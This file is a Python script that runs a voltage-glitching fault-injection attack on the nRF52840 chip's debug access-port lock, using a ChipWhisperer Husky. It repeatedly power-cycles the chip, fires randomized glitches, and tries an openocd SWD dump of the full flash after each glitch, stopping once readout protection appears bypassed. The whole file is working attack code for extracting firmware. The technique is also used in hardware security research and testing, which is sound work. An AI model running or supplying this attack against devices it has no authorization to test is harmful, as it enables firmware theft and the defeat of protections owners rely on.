#!/usr/bin/env python3
# Voltage glitching attack against NRF52840 AP lock using ChipWhisperer Husky.
# Based on the NRF52832 PicoGlitcher example, adapted for HuskyGlitcher.

import argparse
import logging
import random
import subprocess
import sys
import time

from findus import Database
from findus.HuskyGlitcher import HuskyGlitcher


def test_jtag():
    subout = subprocess.run(
        [
            "openocd",
            "-f", "interface/jlink.cfg",
            "-c", "transport select swd",
            "-f", "target/nrf52.cfg",
            "-c", "init; dump_image nrf52_dumped.bin 0x0 0x100000; exit",
        ],
        check=False,
        capture_output=True,
    )
    response = subout.stdout + subout.stderr
    return response


class DerivedGlitcher(HuskyGlitcher):
    def classify(self, response):
        if (
            b"Debug access is denied" in response
            or b"AP lock engaged" in response
            or b"Error connecting DP" in response
        ):
            color = "G"  # expected: AP lock is still active
        elif b"Error: No J-Link device found" in response or b"unspecified error" in response:
            color = "B"  # hardware error
        elif b"Target not examined yet" in response:
            color = "M"  # unusual / interesting
        elif b"Timeout" in response or b"timeout occurred" in response:
            color = "Y"  # timeout
        else:
            color = "R"  # success: glitch bypassed protection
        return color

    def power_cycle_target(self, power_cycle_time=0.2):
        """Power off only. Call power_on_target() separately after arming."""
        self.scope.io.target_pwr = False
        time.sleep(power_cycle_time)

    def power_on_target(self):
        """Turn power back on — triggers the rising edge on TIO4."""
        self.scope.io.target_pwr = True


class Main:
    def __init__(self, args):
        self.args = args
        logging.basicConfig(
            filename="execution.log",
            filemode="a",
            format="%(asctime)s %(message)s",
            level=logging.INFO,
            force=True,
        )

        self.glitcher = DerivedGlitcher()
        self.glitcher.init()
        self.glitcher.rising_edge_trigger()
        self.glitcher.set_hpglitch()

        self.database = Database(
            sys.argv, resume=self.args.resume, nostore=self.args.no_store
        )
        self.start_time = int(time.time())

    def run(self):
        logging.info(" ".join(sys.argv))
        s_delay, e_delay = self.args.delay
        s_length, e_length = self.args.length

        experiment_id = 0
        while True:
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # 1. Power off target (TIO4 goes low)
            self.glitcher.power_cycle_target(0.08)
            # 2. Arm scope while power is off (TIO4 is low)
            self.glitcher.arm(delay, length)
            # 3. Power on target — rising edge on TIO4 fires the trigger
            self.glitcher.power_on_target()

            try:
                self.glitcher.block(timeout=1)
                response = test_jtag()
            except Exception:
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.scope.io.target_pwr = False
                time.sleep(1)
                self.glitcher.scope.io.target_pwr = True
                time.sleep(0.2)
                response = b"Timeout"

            color = self.glitcher.classify(response)
            self.database.insert(experiment_id, delay, length, color, response)

            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(
                self.glitcher.colorize(
                    f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{response}",
                    color,
                )
            )

            experiment_id += 1

            if color == "R":
                time.sleep(1)
                break


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--delay",
        type=int,
        nargs=2,
        required=True,
        help="Delay range in nanoseconds: start end",
    )
    parser.add_argument(
        "--length",
        type=int,
        nargs=2,
        required=True,
        help="Glitch length range in nanoseconds: start end",
    )
    parser.add_argument(
        "--resume",
        action="store_true",
        help="Resume from previous database",
    )
    parser.add_argument(
        "--no-store",
        action="store_true",
        help="Do not store results in database",
    )
    args = parser.parse_args()

    main = Main(args)
    try:
        main.run()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
